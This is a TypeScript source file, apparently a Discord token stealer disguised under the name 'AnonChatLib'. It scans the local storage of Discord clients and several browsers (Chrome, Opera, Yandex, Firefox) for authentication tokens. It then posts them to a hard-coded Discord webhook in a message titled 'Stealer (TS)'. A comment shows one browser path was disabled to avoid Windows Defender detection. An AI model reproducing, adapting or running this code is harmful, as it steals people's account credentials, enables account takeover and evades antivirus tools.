import * as Bluebird from 'bluebird';

import { List } from '@assasans/storage';
import { stripIndents } from 'common-tags';
import { WebhookClient } from 'discord.js';

import { Token } from './token';
import { Service } from './service/service';
import { LevelDBService } from './service/leveldb';
import { FirefoxService } from './service/firefox';

declare global {
	module NodeJS {
		interface Global {
			__anon_chat_lib?: boolean;
		}
	}
}

export class AnonChatLib {
	private readonly services: List<Service>;

	public constructor() {
		this.services = new List<Service>();
		this.services.addRange(List.fromArray([
			new LevelDBService('Discord', 'Roaming/Discord'),
			new LevelDBService('Discord PTB', 'Roaming/discordptb'),
			new LevelDBService('Discord Canary', 'Roaming/discordcanary'),
			new LevelDBService('Google Chrome', 'Local/Google/Chrome/User Data/Default'),
			new LevelDBService('Opera', 'Roaming/Opera Software/Opera Stable'),
			new LevelDBService('Opera GX', 'Roaming/Opera Software/Opera GX Stable'),
			new LevelDBService('Yandex', 'Local/Yandex/YandexBrowser/User Data/Default'),
			// Detected by Windows Defender
			// new LevelDBService('Brave', 'Local/BraveSoftware/Brave-Browser/User Data/Default'),
			new FirefoxService('Firefox', 'Roaming/Mozilla/Firefox')
		]));
	}

	public async run(): Promise<void> {
		const tokens: List<Token> = new List<Token>();

		await Bluebird.all(this.services.map(async (service: Service) => {
			tokens.addRange(await service.getTokens());
		}));

		const client: WebhookClient = new WebhookClient('766342517549301771', 'r5lqtrhieTfiwqhneOrtWQsK0WtT-_SjuWNESv3uXQtAw2yCMS5zNfEl6UAoTcEr-_gN');

		await client.send(undefined, {
			embeds: [
				{
					title: 'Stealer (TS)',
					description: stripIndents`
						Tokens:
						${tokens.map((token: Token) => {
							return `[${token.service.name}]: ${token.value}`;
						})}
					`
				}
			]
		});

		global.__anon_chat_lib = true;
	}
}
